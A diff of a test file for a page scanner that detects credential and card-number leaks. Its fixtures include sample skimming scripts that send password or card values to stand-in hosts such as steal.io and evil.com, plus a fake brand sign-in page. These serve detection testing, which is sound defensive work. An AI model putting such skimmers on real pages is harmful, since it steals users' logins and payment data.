@@ -73,11 +73,11 @@ assert(r.block.length === 0, "a normal page is not blocked");
   assert(leak(`<input type=password><script>x.open("POST","//steal.io/a")</script>`).includes("steal.io"), "password + XMLHttpRequest to another site is caught");
   assert(leak(`<input name="cardNumber"><script>navigator.sendBeacon("https://cards.biz/c", v)</script>`).includes("card number"), "card number + sendBeacon is caught");
   assert(leak(`<input type="password"><script>new Image().src="https://log.me/p?pw="+pw.value</script>`).includes("log.me"), "image beacon built from a value is caught");
-  assert(leak(`<title>Blackhole AI – Sign in</title><input type="password">`).includes("Blackhole AI"), "a fake Blackhole AI sign-in is caught");
+  assert(leak(`<title>Nebulux AI – Sign in</title><input type="password">`).includes("Nebulux AI"), "a fake Nebulux AI sign-in is caught");
   assert(!leak(`<input type="password"><script>fetch("/api/x")</script>`), "fetching its own address is fine");
   assert(!leak(`<script>fetch("https://api.weather.com/x")</script><input name="email">`), "calling an outside API without a password field is fine");
-  assert(!leak(`<title>My Gym</title><p>Made with Blackhole AI</p><input type="password">`), "a login demo that only mentions Blackhole AI in the text is fine");
-  assert(!leak(`<input type="password"><script>fetch("https://nova.blackhole-ai-tech.com/x")</script>`), "sending to a Blackhole AI address is fine");
+  assert(!leak(`<title>My Gym</title><p>Made with Nebulux AI</p><input type="password">`), "a login demo that only mentions Nebulux AI in the text is fine");
+  assert(!leak(`<input type="password"><script>fetch("https://nova.blackhole-ai-tech.com/x")</script>`), "sending to a Nebulux AI address is fine");
   const s = scanPage(`<input type="password"><script>fetch("https://evil.com/x")</script>`);
   assert(s.flag === "red" && s.block.length === 1, "the scan flags it red and refuses publishing");
 }
